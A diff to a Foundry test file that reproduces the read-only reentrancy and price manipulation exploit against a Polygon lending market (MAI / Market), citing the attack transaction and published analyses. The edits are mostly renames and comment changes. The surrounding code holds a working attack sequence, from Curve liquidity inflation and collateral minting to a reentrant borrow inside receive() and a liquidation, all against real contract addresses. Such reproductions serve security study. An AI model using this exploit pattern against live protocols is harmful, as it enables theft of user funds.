@@ -1,5 +1,5 @@
 // SPDX-License-Identifier: UNLICENSED
-pragma solidity ^0.8.0;
+pragma solidity ^0.8.17;
 
 import "forge-std/Test.sol";
 
@@ -10,7 +10,7 @@ import "forge-std/Test.sol";
 // Attack Tx: https://phalcon.blocksec.com/tx/polygon/0xb8efe839da0c89daa763f39f30577dc21937ae351c6f99336a0017e63d387558 
 //            https://polygonscan.com/tx/0xb8efe839da0c89daa763f39f30577dc21937ae351c6f99336a0017e63d387558
 
-// @Analysis
+// @Analyses
 // https://quillaudits.medium.com/decoding-220k-read-only-reentrancy-exploit-quillaudits-30871d728ad5
 // https://ambergroup.medium.com/mai-finances-oracle-manipulation-vulnerability-explained-55e4b5cc2b82
 // https://twitter.com/statemindio/status/1585341766588190720
@@ -20,7 +20,6 @@ contract Liquidator {
     CErc20Interface private constant CErc20_mmooCurvestMATIC_MATIC_4 = CErc20Interface(0x570Bc2b7Ad1399237185A27e66AEA9CfFF5F3dB8);
     ICErc20Delegate private constant CErc20Delegate_mMAI_4           = ICErc20Delegate(0x3dC7E6FF0fB79770FA6FB05d1ea4deACCe823943);
     BeefyVault      private constant beefyVault                      = BeefyVault(0xE0570ddFca69E5E90d83Ea04bb33824D3BbE6a85);  
-    IUnitroller     private constant UniTroller                      = IUnitroller(0x627742AaFe82EB5129DD33D237FF318eF5F76CBC);
     IERC20          private constant miMATIC                         = IERC20(0xa3Fa99A148fA48D14Ed51d610c367C61876997F1); 
     
     // https://www.youtube.com/watch?v=w-oVV0Ie3Fw&t=188s&ab_channel=SmartContractProgrammer
@@ -49,7 +48,7 @@ contract MarketExploitTest is Test {
     IERC20     private constant stMATIC_f     = IERC20(0xe7CEA2F6d7b120174BF3A9Bc98efaF1fF72C997d);      // Curve LP token
     BeefyVault private constant beefyVault    = BeefyVault(0xE0570ddFca69E5E90d83Ea04bb33824D3BbE6a85);  // mooCurvestMATIC-MATIC
 
-    IUnitroller   private constant UniTroller = IUnitroller(0x627742AaFe82EB5129DD33D237FF318eF5F76CBC);
+    IUnitroller   private constant unitroller = IUnitroller(0x627742AaFe82EB5129DD33D237FF318eF5F76CBC);
     IRouter       private constant router     = IRouter(0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff);
     Uni_Router_V3 private constant routerV3   = Uni_Router_V3(0xf5b509bB0909a69B1c207E495f687a596C168E12);
 
@@ -132,27 +131,26 @@ contract MarketExploitTest is Test {
         WMATIC.approve(address(vyperContract), type(uint256).max);
         stMATIC.approve(address(vyperContract), type(uint256).max);
 
-        vyperContract.add_liquidity([uint256(19_664_260 ether), uint256(49_999_999 ether)], 0);   // mint 34_640_026.55 stMATIC_f   
+        vyperContract.add_liquidity([uint256(19_664_260 ether), uint256(49_999_999 ether)], 0);   // mint 34_640_026 stMATIC_f   
 
-        // mint part of Curve LP tokens as collateral to Market via Beefy Vault
         address[] memory market = new address[](1);
         market[0] = address(CErc20_mmooCurvestMATIC_MATIC_4);   
-        UniTroller.enterMarkets(market);
+        unitroller.enterMarkets(market);
 
-        // deposit 90_000 stMATIC_f and mint 85901 mooCurvestMATIC-MATIC (BeefyVault token)
+        // deposit 90_000 stMATIC_f and mint 85901 mooCurvestMATIC-MATIC (BeefyVault token) as collateral to Market via Beefy Vault
         stMATIC_f.approve(address(beefyVault), type(uint256).max);
-        beefyVault.deposit(90_000 ether);  
+        beefyVault.deposit(90_000 ether);
 
         // use 85_901 mooCurvestMATIC-MATIC to mint 429_505 Ctokens
         beefyVault.approve(address(CErc20_mmooCurvestMATIC_MATIC_4), type(uint256).max);
         CErc20_mmooCurvestMATIC_MATIC_4.mint(beefyVault.balanceOf(address(this)));  
 
-        // remove liquidity from WMATIC/stMATIC Curve pool, receive WMATIC, stMATIC, miMATIC. This step increases collateral price
+        // remove liquidity from WMATIC/stMATIC Curve pool: receive WMATIC, stMATIC, miMATIC. This step increases collateral price
         vyperContract.remove_liquidity(stMATIC_f.balanceOf(address(this)), [uint256(0), uint256(0)], true);  // burn stMATIC_f, trigger receive()  
     }
 
     function _liquidate() internal {
-        Liquidator liquidator = new Liquidator();  // wouldn't work if put in storage
+        Liquidator liquidator = new Liquidator();
         miMATIC.transfer(address(liquidator), miMATIC.balanceOf(address(this)));  // use MAI to liquidate collateral
         liquidator.liquidate(address(this));
 
@@ -165,7 +163,7 @@ contract MarketExploitTest is Test {
 
     receive() external payable {
         //  Borrow MAI with expensive collateral 
-        // (,uint256 amount,) = UniTroller.getAccountLiquidity(address(this));  191
+        // (,uint256 amount,) = unitroller.getAccountLiquidity(address(this));  191
         CErc20Delegate_mMAI_4.borrow(250_000 ether);  // 250_000 miMATIC 
     }
 
@@ -227,7 +225,6 @@ interface IUnitroller {
     function exitMarket(address cTokenAddress) external returns (uint256);
     function cTokensByUnderlying(address) external view returns (address);
     function getAccountLiquidity(address account) external view returns (uint256, uint256, uint256);
-
 }
 
 interface IERC20 {
